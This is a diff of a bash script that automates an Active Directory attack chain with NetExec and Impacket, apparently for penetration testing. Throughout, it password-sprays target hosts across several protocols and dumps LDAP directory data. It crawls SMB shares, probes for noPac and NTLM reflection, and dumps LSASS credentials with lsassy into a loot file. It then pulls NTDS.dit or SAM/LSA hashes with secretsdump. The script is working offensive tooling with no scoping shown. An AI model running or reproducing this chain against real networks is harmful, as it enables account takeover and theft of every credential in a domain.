@@ -82,6 +82,8 @@ get_domain() {
     done
 
     local domain="" hostname="" nxc_out
+
+    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress (domain detection)${NC}"
     nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
     domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
     hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)
@@ -108,120 +110,82 @@ for ip in "${!PROTO_MAP[@]}"; do
     echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
     DOMAIN=$(get_domain "$ip")
 
+    # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
+    if [[ "$DOMAIN" == "." ]]; then
+        echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}"
+        echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}"
+
+
+        ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
+        ldap_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
+
+        if [[ -n "$ldap_domain" && "$ldap_domain" != "WORKGROUP" ]]; then
+            DOMAIN="$ldap_domain"
+            echo -e "${GREEN}[+] Domain recovered via LDAP: $DOMAIN${NC}"
+        fi
+    fi
+
+
     for proto in ${PROTO_MAP[$ip]}; do
         echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
+
         DOMAIN_ARG=""
         EXTRA=""
-        [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
 
-        # -----------------------------------------------------------------
-        # STEP 1: LOCAL AUTH SPRAY (ANTI-TIMEOUT LOGIC)
-        # -----------------------------------------------------------------
         attempt_spray=1
         max_spray=2
-        
+
+        # ======================================================
+        # STEP 1: DEFAULT AUTH (DOMAIN-AWARE)
+        # ======================================================
         while [ $attempt_spray -le $max_spray ]; do
-            echo -e "${GRAY}[CMD] (Attempt $attempt_spray/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE $EXTRA --continue-on-success --no-progress${NC}"
-            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
+            echo -e "${GRAY}[CMD] (Attempt $attempt_spray/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE --continue-on-success --no-progress${NC}"
 
-            # Menampilkan output asli ke layar Anda
+            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --continue-on-success --no-progress > "$TMP_RES" 2>&1
+
             cat "$TMP_RES"
-
-            # Membersihkan kode warna internal pada file temporary sebelum di-grep
             sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
             cat "$TMP_RES" >> "$RAW_OUT"
-
-            # Proses ekstraksi kredensial sukses dijamin akurat 100%
             grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
 
-            # 1. JIKA SUKSES -> Keluar dari loop
-            if [[ -s "$TMP_SUCCESS" ]]; then
-                break
-            fi
+            [[ -s "$TMP_SUCCESS" ]] && break
 
-            # 2. JIKA OUTPUT KOSONG (Kasus Hang / Tanpa Respons) -> Coba lagi (Retry)
-            if [[ ! -s "$TMP_RES" ]]; then
-                echo -e "${YELLOW}[!] Target returned NO OUTPUT (possible hang/drop). Retrying...${NC}"
-                if [ $attempt_spray -eq $max_spray ]; then
-                    echo "$ip;$proto;LOCAL_NO_OUTPUT_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
-                fi
-                ((attempt_spray++))
-                sleep 1
-
-            # 3. JIKA TIMEOUT / ERROR JARINGAN DI TEXT -> Coba lagi (Retry)
-            elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
-                echo -e "${YELLOW}[!] Timeout detected during Local Auth. Retrying...${NC}"
-                if [ $attempt_spray -eq $max_spray ]; then
-                    echo "$ip;$proto;LOCAL_AUTH_TIMEOUT" >> "$BROKEN_PIPE_LOG"
-                fi
-                ((attempt_spray++))
-                sleep 1
-
-            # 4. JIKA NYATA GAGAL AUTENTIKASI (Kredensial Salah) -> Langsung keluar, jangan diulang!
-            elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
-                echo -e "${YELLOW}[-] Authentication definitely rejected by target. Skipping retries.${NC}"
-                break
-
-            # 5. JIKA ADA OUTPUT TAPI ERROR TIDAK DIKENAL -> Gabung ke log investigasi & langsung hentikan loop
+            if grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
+                ((attempt_spray++)); sleep 1
             else
-                echo -e "${RED}[!] Unknown error response detected. Logging for investigation and skipping...${NC}"
-                echo "$ip;$proto;LOCAL_UNKNOWN_ERROR_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
                 break
             fi
         done
 
-        # -----------------------------------------------------------------
-        # STEP 2: DOMAIN AUTH SPRAY (ANTI-TIMEOUT LOGIC)
-        # -----------------------------------------------------------------
-        if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
-            echo -e "${PURPLE}[EXEC] Local auth missed or finished. Trying Domain Spray on $ip ($proto)...${NC}"
-            attempt_dom=1
-            EXTRA="" 
-            
-            while [ $attempt_dom -le $max_spray ]; do
-                echo -e "${GRAY}[CMD] (Attempt $attempt_dom/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE -d $DOMAIN --continue-on-success --no-progress${NC}"
-                timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress 2>&1 | tee "$TMP_RES"
+        # ======================================================
+        # STEP 2: LOCAL AUTH FALLBACK
+        # ======================================================
+        if [[ ! -s "$TMP_SUCCESS" ]]; then
+            echo -e "${GRAY}[CMD] fallback --local-auth${NC}"
+            echo -e "${GRAY}[CMD] timeout 45s nxc $proto $ip -u $USER_FILE -p $PASS_FILE --local-auth --continue-on-success --no-progress${NC}"
 
-                sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
-                cat "$TMP_RES" >> "$RAW_OUT"
-                grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
-                
-                # 1. JIKA SUKSES -> Keluar dari loop
-                if [[ -s "$TMP_SUCCESS" ]]; then
-                    DOMAIN_ARG="-d $DOMAIN"
-                    break
-                fi
+            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
 
-                # 2. JIKA OUTPUT KOSONG (Kasus Hang / Tanpa Respons) -> Coba lagi (Retry)
-                if [[ ! -s "$TMP_RES" ]]; then
-                    echo -e "${YELLOW}[!] Target returned NO OUTPUT during Domain Spray. Retrying...${NC}"
-                    if [ $attempt_dom -eq $max_spray ]; then
-                        echo "$ip;$proto;DOMAIN_NO_OUTPUT_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
-                    fi
-                    ((attempt_dom++))
-                    sleep 1
+            cat "$TMP_RES"
+            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
+            cat "$TMP_RES" >> "$RAW_OUT"
+            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+        fi
 
-                # 3. JIKA TIMEOUT / ERROR JARINGAN DI TEXT -> Coba lagi (Retry)
-                elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
-                    echo -e "${YELLOW}[!] Timeout detected during Domain Auth. Retrying...${NC}"
-                    if [ $attempt_dom -eq $max_spray ]; then
-                        echo "$ip;$proto;DOMAIN_TIMEOUT_OR_BROKEN_PIPE" >> "$BROKEN_PIPE_LOG"
-                    fi
-                    ((attempt_dom++))
-                    sleep 1
+        # ======================================================
+        # Falback DOMAIN
+        # ======================================================
+        if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." ]]; then
+            echo -e "${PURPLE}[EXEC] Trying explicit domain auth${NC}"
+            echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
 
-                # 4. JIKA NYATA GAGAL AUTENTIKASI (Kredensial Salah) -> Langsung keluar
-                elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
-                    echo -e "${YELLOW}[-] Domain Authentication definitely rejected by target. Skipping retries.${NC}"
-                    break
+            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress | tee "$TMP_RES"
 
-                # 5. JIKA ADA OUTPUT TAPI ERROR TIDAK DIKENAL -> Gabung ke log investigasi & langsung hentikan loop
-                else
-                    echo -e "${RED}[!] Unknown domain error response detected. Logging for investigation and skipping...${NC}"
-                    echo "$ip;$proto;DOMAIN_UNKNOWN_ERROR_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
-                    break
-                fi
-            done
+            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
+            cat "$TMP_RES" >> "$RAW_OUT"
+            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+
+            [[ -s "$TMP_SUCCESS" ]] && DOMAIN_ARG="-d $DOMAIN"
         fi
 
         # -----------------------------------------------------------------
@@ -311,7 +275,7 @@ for ip in "${!PROTO_MAP[@]}"; do
                     LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
                 fi
                 echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
-                echo "[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
+                echo -e "${GRAY}[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\"${NC}"
                 timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
                 # === EXPORT USERS VIA LDAP (HANYA JIKA SMB BELUM BERHASIL) ===
                 if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
@@ -329,66 +293,90 @@ for ip in "${!PROTO_MAP[@]}"; do
             fi
 
             # --- SMB POST-EXPLOIT---
+            
             if [[ "$proto" == "smb" ]]; then
-                # === EXPORT USERS VIA SMB (HANYA JIKA BELUM PERNAH SUKSES DI DOMAIN INI) ===
+
+                # ===== USERS EXPORT (DOMAIN ONLY) =====
                 if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
                     echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
                     echo -e "${GRAY}[CMD] timeout 40s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
-                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" 
+
+                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp"
+
                     if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                         cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                         rm -f "$USER_EXPORT_OUT.tmp"
-                        USER_EXP_DONE[$DOMAIN]=1  # <-- Kunci domain ini agar LDAP tidak perlu running lagi
-                        echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
+                        USER_EXP_DONE[$DOMAIN]=1
+                        echo -e "${GREEN}[+] SMB user export success for $DOMAIN${NC}"
                     fi
                 fi
+    
+
+
                 ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
-                echo -e "${PURPLE}[EXEC] Running spider_plus...${NC}"
-                echo -e "${GRAY}[CMD] timeout 60s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$ABS_SPIDER${NC}"
-                timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" 
-                
-                echo -e "${GRAY}[CMD] timeout 30s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
-                # Gunakan file temporary Anda untuk menampung lalu tampilkan ke layar, baru di-grep
-                timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac > "$TMP_RES" 2>&1
-                cat "$TMP_RES" # <--- Tetap memunculkan semua prosesnya ke layar Anda
-                grep -qi "VULNERABLE" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"; }
 
+                # ---------- SPIDER ----------
+                echo -e "${RED}[EXEC] Running spider_plus module${NC}"
+                echo -e "${GRAY}[CMD] timeout 60s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus${NC}"
+                if [[ "$DOMAIN" != "." ]]; then
+                    timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
 
-                echo -e "${GRAY}[CMD] timeout 30s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
-                timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection > "$TMP_RES" 2>&1
-                cat "$TMP_RES" # <--- Tetap memunculkan semua prosesnya ke layar Anda
-                grep -qi "vulnerable" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"; }
-
-
-                if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
-                    BH_DONE[$DOMAIN]=1
-                    BH_DIR="$OUTDIR/bloodhound_${ip}"
-                    mkdir -p "$BH_DIR"
-                    echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
-
-                    echo -e "${GRAY}[CMD] cd $BH_DIR && timeout 150s bloodhound-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$ip\" -c all${NC}"
-                    (
-                        cd "$BH_DIR" || exit
-                        # Menggunakan tee agar output muncul di terminal SEKALIGUS ditulis ke log
-                        timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all 2>&1 | tee bloodhound_run.log
-                    )
-                    if ls "$BH_DIR"/*.json >/dev/null 2>&1; then
-                        echo -e "${GREEN}[+] BloodHound ingestion completed successfully!${NC}" # <--- Biar ada konfirmasi instan di layar
-                        echo "[$proto] $ip - [BH] BloodHound ingestion completed successfully" >> "$CLEAN_OUT"
-                    else
-                        echo -e "${RED}[!] BloodHound ingestion failed or timed out. Check $BH_DIR/bloodhound_run.log${NC}"
+                    if ! grep -qi "accessible" "$TMP_RES"; then
+                        timeout 60s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                     fi
+                else
+                    timeout 60s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                 fi
 
-                if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
-                    echo -e "${RED}[EXEC] Pwn3d! Target, running lsassy...${NC}"
-                    echo -e "${GRAY}[CMD] timeout 40s nxc smb $ip -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy${NC}"
-                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $EXTRA $DOMAIN_ARG -M lsassy > "$TMP_RES" 2>&1
-                    if grep -qiE "dumped|success" "$TMP_RES"; then
-                        echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
+                # ---------- NOPAC ----------
+                echo -e "${RED}[EXEC] Running nopac module${NC}"
+                echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
+                if [[ "$DOMAIN" != "." ]]; then
+                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac | tee "$TMP_RES"
+                    if ! grep -qi "VULNERABLE" "$TMP_RES"; then
+                        timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
                     fi
+                else
+                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
+                fi
+
+                # ---------- NTLM REFLECTION ----------
+                echo -e "${RED}[EXEC] Running ntlm_reflection module${NC}"
+                echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
+                if [[ "$DOMAIN" != "." ]]; then
+                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection | tee "$TMP_RES"
+                    if ! grep -qi "vulnerable" "$TMP_RES"; then
+                        timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
+                    fi
+                else
+                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
+                fi
+
+                # ---------- LSASSY ----------
+                if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
+                    echo -e "${RED}[EXEC] Running lsassy${NC}"
+
+                    if [[ "$DOMAIN" != "." ]]; then
+                        echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M lsassy${NC}"
+                        timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M lsassy | tee "$TMP_RES"
+
+                        if ! grep -qiE "dumped|success" "$TMP_RES"; then
+                            echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M lsassy${NC}"
+                            timeout 40s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
+                        fi
+                    else
+                        echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M lsassy${NC}"
+                        timeout 40s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
+                    fi
+
+                    if grep -qiE "dumped|success" "$TMP_RES"; then
+                        echo "[$proto] $ip - [LSASS] Dump success" >> "$CLEAN_OUT"
+                        cat "$TMP_RES" >> "$OUTDIR/lsassy_loot.txt"
+                    fi
+
                 fi
             fi
+
         fi
     done
 done
@@ -500,39 +488,58 @@ if [[ -s "$FINAL_CREDS_FILE" ]]; then
         fi
         
         DOMAIN=$(get_domain "$ip")
-        [[ "$DOMAIN" == "." ]] && DOMAIN="WORKGROUP"
-        
-        echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $ip using $cred_user...${NC}"
-        
+
+        # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
+        if [[ "$DOMAIN" == "." ]]; then
+            echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}"
+            echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}"
+
+            ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
+            ldap_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
+
+            if [[ -n "$ldap_domain" && "$ldap_domain" != "WORKGROUP" ]]; then
+                DOMAIN="$ldap_domain"
+                echo -e "${GREEN}[+] Domain recovered via LDAP: $DOMAIN${NC}"
+            fi
+        fi
+
+
+        # BUILD TARGET
+        if [[ "$DOMAIN" == "." ]]; then
+            TARGET="$cred_user:$cred_pass@$ip"
+        else
+            TARGET="$DOMAIN/$cred_user:$cred_pass@$ip"
+        fi
+
         dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"
-        
-        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$DOMAIN/$cred_user:$cred_pass@$ip\" -outputfile \"$dump_out_name\"${NC}"
-        echo -e "${BLUE}--- SECRETSDUMP LIVE OUTPUT ---${NC}"
-        
-        # Eksekusi live dengan tee
-        timeout 120s impacket-secretsdump -just-dc "$DOMAIN/$cred_user:$cred_pass@$ip" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+
+        # --- JUST-DC ---
+
+        echo -e "${GRAY}[CMD] secretsdump -just-dc $TARGET${NC}"
+
+        timeout 120s impacket-secretsdump -just-dc "$TARGET" -outputfile "$dump_out_name" | tee -a "$OUTDIR/secretsdump_run.log"
+
+        # CHECK
+        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
+            echo -e "${GREEN}[+] NTDS dumped${NC}"
+            echo "$ip" >> "$DUMPED_IPS_TRACKER"
+
+        else
+            echo -e "${YELLOW}[!] fallback full dump${NC}"
+            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET\" -outputfile \"$dump_out_name\"${NC}"
+            timeout 180s impacket-secretsdump "$TARGET" -outputfile "$dump_out_name" | tee -a "$OUTDIR/secretsdump_run.log"
+
+            if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
+                echo -e "${GREEN}[+] SAM/LSA dumped${NC}"
+                echo "$ip" >> "$DUMPED_IPS_TRACKER"
+            else
+                echo -e "${RED}[-] dump failed${NC}"
+                # Membersihkan file sampah/kosong hasil generate impacket yang gagal
+                rm -f "${dump_out_name}.ntds" 2>/dev/null
+            fi
+        fi
         
         echo -e "${BLUE}-------------------------------${NC}"
-        
-        # -----------------------------------------------------------
-        # Validasi Keberhasilan Dump secara Akurat
-        # -----------------------------------------------------------
-        # Impacket menghasilkan file dengan akhiran .ntds. 
-        # Kita cek apakah file ada, tidak kosong, DAN mengandung struktur hash NTLM (seperti :::)
-        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
-            echo -e "${GREEN}[+++] SUCCESS! Domain hashes dumped successfully from $ip${NC}"
-            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
-            
-            # Catat IP ini ke tracker agar tidak di-dump ulang oleh user lain
-            echo "$ip" >> "$DUMPED_IPS_TRACKER"
-        else
-            echo -e "${RED}[-] Failed to dump NTDS from $ip using $cred_user (Access Denied / DRSUAPI Error)${NC}"
-            echo -e "${GRAY}[DEBUG] Full log history saved in $OUTDIR/secretsdump_run.log${NC}"
-            
-            # Membersihkan file sampah/kosong hasil generate impacket yang gagal
-            rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
-        fi
-        echo "------------------------------------------------------------"
         
     done < "$FINAL_CREDS_FILE"
     
